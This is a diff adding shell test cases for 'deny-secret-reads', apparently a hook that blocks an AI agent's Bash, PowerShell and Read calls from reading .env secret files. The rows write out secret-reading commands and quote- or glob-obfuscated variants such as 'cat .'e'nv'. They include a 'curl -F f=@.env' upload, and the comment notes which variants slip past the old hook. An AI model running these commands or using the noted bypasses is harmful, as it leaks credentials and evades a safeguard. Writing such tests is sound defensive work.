@@ -9643,6 +9643,50 @@ else
   # The bound is on the whole PAYLOAD (about 250 bytes of envelope), so the output is sized to keep it under THRESHOLD.
   expect "C4: bash-output-guard on a payload of <= 12,000 bytes (11,700-char output) runs no interpreter" 0 "$(c4_n bash-output-guard "$(c4_post "$(yes a | head -n 11700 | tr -d '\n')")" '^(node|python3|jq)$')"
 fi
+# deny-secret-reads (Task 6): every Bash/PowerShell refusal goes through dsr_is_secret on a
+# quote-stripped token, and that accepts only a basename starting `.e` (any case: `.env…`, `.e*v`,
+# `.e?v`) -- the regex needs `.env`, the glob heuristic needs `.e` -- or, conservatively, a token
+# carrying a backslash. The early exit sits after the one parse and its BLOCKED branches, before the
+# `tr` token pipelines. Expected values are the OLD hook's answers (9007349), not what the rows "should" be:
+# `curl -F f=@.env x`, `cat .\env` and PowerShell `Get-Content .env` are 0 there (key `f` is not
+# input-shaped; a backslash token matches neither shape; Get-Content is no listed verb).
+c4_sr() { # <label> <expected_exit> <tool> <command>
+  check "C4 deny-secret-reads: $1" hooks/deny-secret-reads.sh "$2" "$(mkjson "$3" "$4" "$TMPROOT")"
+}
+c4_sr "cat .env"                          2 Bash "cat .env"
+c4_sr "head ./.env.local"                 2 Bash "head -1 ./.env.local"
+c4_sr "sed .env.production"               2 Bash "sed -n 1p .env.production"
+c4_sr "grep KEY .env"                     2 Bash "grep KEY .env"
+c4_sr "cp .env /dev/stdout"               2 Bash "cp .env /dev/stdout"
+c4_sr "curl -F f=@.env x (old: allowed)"  0 Bash "curl -F f=@.env x"
+c4_sr "cat .e*v"                          2 Bash "cat .e*v"
+c4_sr "cat .'e'nv"                        2 Bash "cat .'e'nv"
+c4_sr "cat '.'\"e\"nv"                    2 Bash "cat '.'\"e\"nv"
+c4_sr "cat .\"e\"nv"                      2 Bash "cat .\"e\"nv"
+c4_sr "source .env"                       2 Bash "source .env"
+c4_sr ". .env"                            2 Bash ". .env"
+c4_sr "ok: cat .env.example"              0 Bash "cat .env.example"
+c4_sr "ok: cat .environment"              0 Bash "cat .environment"
+c4_rd() { # <file_path> -> a Read payload
+  printf '{"session_id":"t","hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"file_path":"%s"},"cwd":"%s"}\n' "$(jesc "$1")" "$(jesc "$TMPROOT")"
+}
+check "C4 deny-secret-reads: Read .env"            hooks/deny-secret-reads.sh 2 "$(c4_rd "$TMPROOT/.env")"
+check "C4 deny-secret-reads: Read config/.env.staging" hooks/deny-secret-reads.sh 2 "$(c4_rd "$TMPROOT/config/.env.staging")"
+check "C4 deny-secret-reads: ok: Read README.md"   hooks/deny-secret-reads.sh 0 "$(c4_rd "$TMPROOT/README.md")"
+c4_sr "cat \".e\"nv"                      2 Bash 'cat ".e"nv'
+c4_sr "cat .\\env (old: allowed)"         0 Bash 'cat .\env'
+c4_sr "cat \$HOME/.env"                   2 Bash 'cat $HOME/.env'
+c4_sr "cat .ENV (case)"                   2 Bash "cat .ENV"
+c4_sr "cp '.'env /dev/stdout"             2 Bash "cp '.'env /dev/stdout"
+c4_sr "curl -F f=@.'e'nv x (old: allowed)" 0 Bash "curl -F f=@.'e'nv x"
+c4_sr "PowerShell Get-Content .env (old: allowed)" 0 PowerShell "Get-Content .env"
+c4_sr "PowerShell cat .env"               2 PowerShell "cat .env"
+c4_sr "ok: ls -la"                        0 Bash "ls -la"
+if [ -z "$HAVE_NODE" ]; then
+  skip "C4: deny-secret-reads spawn row" "no working node on this host" 1
+else
+  expect "C4: deny-secret-reads on ls -la runs no tr" 0 "$(c4_n deny-secret-reads "$(mkjson Bash 'ls -la' "$TMPROOT")" '^tr$')"
+fi
 # ---- end v4.4.0 C4
 
 echo "----------------------------------------------------------------"
